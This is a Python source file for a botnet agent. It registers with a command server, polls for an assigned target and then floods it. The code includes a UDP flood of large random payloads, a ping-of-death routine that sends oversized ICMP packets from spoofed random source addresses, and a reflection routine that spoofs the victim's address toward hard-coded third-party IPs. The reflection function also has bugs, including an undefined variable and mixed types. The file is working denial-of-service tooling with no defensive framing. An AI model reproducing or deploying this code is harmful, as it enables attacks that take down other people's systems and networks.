"""
    Execution Flow:
        1. Check if config file with registration info exists
        2. Pull data from that file.  If it doesn't exist, register self with
            server and create registration info file
        3. Contact server using UUID in registration file, determine if active
            and assigned task.
        4. Continue to check for task if no task.
        5. Once a task is given, perform task (ping X number of times) and check
            if still active and if still assigned
"""

import requests
import json
import socket
import random
import os
from time import sleep
from scapy.all import *
from scapy.layers.inet import IP, ICMP

API_URL = ""
UUID = ""

def get_uuid():
    """
        Gets and saves a unique identifier for this computer.
        Only called if the 'config' file does not exist
    """
    if not API_URL:
        get_api_location()
    pc_name = socket.gethostname()
    response = requests.put(API_URL + "/clients?name=" + pc_name)
    return response.json()


def get_api_location():
    """
        Gets the domain name of the API from file.  This file really needs to
        exist
    """
    try:
        file = open("domain")
        for line in file.readlines():
            global API_URL
            API_URL = line.rstrip()
            break
    except:
        print("Holy fuck, the only thing you had to do and you didn't do it")


def get_config():
    global UUID
    try:
        file = open("config", "r+")
        for line in file.readlines():
            UUID = line
            break
        file.close()
    except:
        UUID = get_uuid()
        file = open("config", "x")
        file.write(str(UUID))


def ping(target, port, chunksize):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65507)
    i = 0
    while i <= chunksize:
        sock.sendto(bytes,(target,port))
        print("Sent " + str(i) + " packets")
        i+=1
def pod(target, port, chunksize):
    addr = [192, 168, 100, 10]
    d = "."
    addr[0] = str(random.randrange(128,223))
    addr[1] = str(random.randrange(0,255))
    addr[2] = str(random.randrange(0,255))
    addr[3] = str(random.randrange(2,254))
    full_addr = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]

    print (full_addr)

    while chunksize > 0:

        ip_head =(IP(src = full_addr, dst = target))
        package = ip_head/ICMP(dport = port)/('m'*66000)
        send(package)
        chunksize-=1

def dns_amp(target, port, chunksize):
    d = "."
    print(full_addr)
    dns1 = 156+d+154+d+70+d+29
    dns2 = 216+d+38+d+105+d+6
    while chunksize > 0:
        ip_head = (IP(src=target, dst=dns1))
        ip_head1 = IP(src = target, dst = dns2)
        package = ip_head / ICMP(dport=port) / ('m' * 60000)
        package1 = ip_head1 / ICMP(dport=port) / ('m' * 60000)
        send(package)
        send(package1)
        chunksize -= 1


def get_assignment():
    data = requests.get(API_URL + "/clients/" + UUID).json()[0]
    active = data['active']
    task_id = data['task_id']
    if active and task_id:
        task = requests.get(API_URL + "/tasks/" + str(task_id)).json()[0]
        target = task['target']
        port = task['port']
        chunksize = task['chunksize']
        #type_dos = task['type']
        return target, port, chunksize
        #return target, port, chunksize, type_dos
    return False, False, False,


def perform_dos():
    while True:
        target, port, chunksize = get_assignment()
        #target, port, chunksize,  type_dos = get_assignment()
        if target and port and chunksize:
            ping(target, port, chunksize)
        else:
            print("No Assignment")
            sleep(5)


def main():
    get_api_location()
    get_config()
    perform_dos()


main()
